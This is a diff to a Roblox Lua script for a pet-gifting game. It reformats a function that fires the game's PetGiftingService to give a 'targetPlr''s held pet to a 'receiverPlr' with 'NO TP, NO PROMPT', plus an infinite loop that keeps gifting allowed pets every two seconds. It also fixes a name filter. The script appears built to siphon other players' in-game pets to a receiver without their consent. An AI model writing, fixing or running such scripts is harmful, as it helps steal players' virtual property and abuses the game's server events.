@@ -689,39 +689,37 @@ local function IsPetAllowed(petName)
     return AllowedGiftPets[petName] == true
 end
 
-        -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
-        local function giftHeldPet()
-            local char = targetPlr.Character
-            if not char then return false end
-            local held = char:FindFirstChildWhichIsA("Tool")
-            if not held then return false end
+-- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
+local function giftHeldPet()
+    local char = targetPlr.Character
+    if not char then return false end
+    local held = char:FindFirstChildWhichIsA("Tool")
+    if not held then return false end
 
-            local success, err = pcall(function()
-                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-            end)
+    local success, err = pcall(function()
+        RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+    end)
 
-            if success then
-                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
-                return true
-            else
-                warn("Gift failed:", err)
-                return false
-            end
-        end
+    if success then
+        print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
+        return true
+    else
+        warn("Gift failed:", err)
+        return false
+    end
+end
 
-        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-        task.spawn(function()
+-- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
+task.spawn(function()
     while true do
         task.wait(2)  -- Re-scan every 2 seconds
         local currentPets = GetPlayerPets()
         if #currentPets == 0 then continue end
 
         for _, pet in ipairs(currentPets) do
-
-            -- 🔥 FILTER START
-            -- Jika nama pet tidak ada di list AllowedGiftPets → skip
-            if not IsPetAllowed(pet.Name) then
-                -- print("Skipped (not allowed):", pet.Name)
+            
+            -- 🔥 FILTER START (perbaikan: pakai pet.PetName)
+            if not IsPetAllowed(pet.PetName) then
                 continue
             end
             -- 🔥 FILTER END
